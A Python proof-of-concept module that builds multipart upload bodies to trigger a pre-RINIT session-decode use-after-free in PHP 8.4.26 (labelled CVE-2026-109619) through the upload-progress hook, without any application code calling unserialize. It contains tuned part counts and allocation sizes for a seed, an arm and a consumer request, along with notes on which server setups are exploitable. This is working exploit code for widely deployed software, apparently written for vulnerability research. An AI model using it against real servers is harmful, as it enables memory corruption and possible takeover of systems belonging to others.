#!/usr/bin/env python3
# INDEX: app-free session-decode-oom unserialize dangle arm | cli apache | needs raised memory_limit
"""App-free pre-RINIT session-decode-OOM BG(unserialize) dangle arm
(CVE-2026-109619). The session-decoder sibling of rshutdown_dangle.py: the arm's
pre-RINIT session decode OOMs mid-php_var_unserialize, so the skipped
PHP_VAR_UNSERIALIZE_DESTROY leaves BG(unserialize) dangling and the next
request's decode reuses the freed struct -> UAF (var_unserializer.re:166). No app
unserialize()/session_start() needed - it rides the rfc1867 upload-progress hook.

SAPI: CLI `php -S` deterministic; Apache mod_php probabilistic (layout-dependent);
PHP-FPM no (pre-RINIT OOM -> worker exit 70, can't self-arm). 8.4.26 vuln, 8.4.27
fixed. Adapted from atombarel (https://github.com/atombarel/php2shell-cli-1mb-lab).

Builders return part lists for common.multipart.multipart_default; no network.
The arm's decode OOMs only with enough headroom (needs memory_limit ~128M; the
stock 16M ASAN lab does not reproduce it). Safe under `python3 -I`.
"""
from __future__ import annotations

import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.multipart import PROGRESS_KEY, part_tuple as part  # noqa: E402

# atombarel's verified geometry (CLI `php -S`, memory_limit=128M); all overridable.
SEED_RECORD_LEN = 600_000     # progress marker -> the big session record the arm OOMs decoding
SEED_PARTS = 880              # $_FILES churn parts (seed body)
ARM_PARTS = 864               # churn parts (arm/late body)
CONSUMER_PARTS = 700          # churn parts (consumer body)
_PROGRESS = PROGRESS_KEY.decode()


def _churn(index):
    """One empty $_FILES "churn" part; the nested name + i<2 ctype widths
    reproduce the reference allocation sizes."""
    name = f"files[R{index:05d}{'K' * 90}]" + "[a]" * 62
    if index < 2:
        return part(name, b"", filename="A", ctype="C" * (103 if index == 0 else 231))
    return part(name, b"", filename="", ctype="application/octet-stream")


def _tail():
    return part("lastfile", b"", filename="X", ctype="application/octet-stream")


def seed_body(sid, record_len=SEED_RECORD_LEN, nparts=SEED_PARTS, tag=b"A"):
    """SEED parts: write a large upload-progress session record for `sid` (the
    record the arm later OOMs decoding)."""
    marker = b"k" * (record_len - len(tag)) + tag
    return ([part("PHPSESSID", sid), part(_PROGRESS, marker)]
            + [_churn(i) for i in range(nparts)])


def arm_body(sid, nparts=ARM_PARTS):
    """ARM ("late") parts: the pre-RINIT decode of `sid`'s record OOMs in
    php_var_unserialize, leaving BG(unserialize) dangling on the surviving worker."""
    return ([part("PHPSESSID", sid)]
            + [_churn(i) for i in range(nparts)]
            + [part(f"f{i:04d}".ljust(103, "x"), b"v" * 8) for i in range(14)]
            + [part(f"u{i:02d}", b"U" * 4000) for i in range(20)]
            + [part(_PROGRESS, b"k" * 4000), part("nested_t000" + "[a]" * 27, b"v"), _tail()])


def consumer_body(sid, nparts=CONSUMER_PARTS):
    """CONSUMER parts: the pre-RINIT decode hits php_var_unserialize_init's REUSE
    branch and dereferences the dangling BG(unserialize).data -> UAF."""
    return ([part("PHPSESSID", sid)]
            + [_churn(i) for i in range(nparts)]
            + [part(f"b{i:04d}", b"B" * 8200) for i in range(50)]
            + [part(_PROGRESS, b"k" * 2), _tail()])


if __name__ == "__main__":  # smoke test (no network)
    from common.multipart import multipart_default
    for name, parts in (("seed", seed_body("codexprobe123456")),
                        ("arm", arm_body("codexprobe123456")),
                        ("consumer", consumer_body("codexprobe123457"))):
        body, _ = multipart_default(parts)
        print(f"{name:9}: {len(parts)} parts, {len(body)} body bytes")
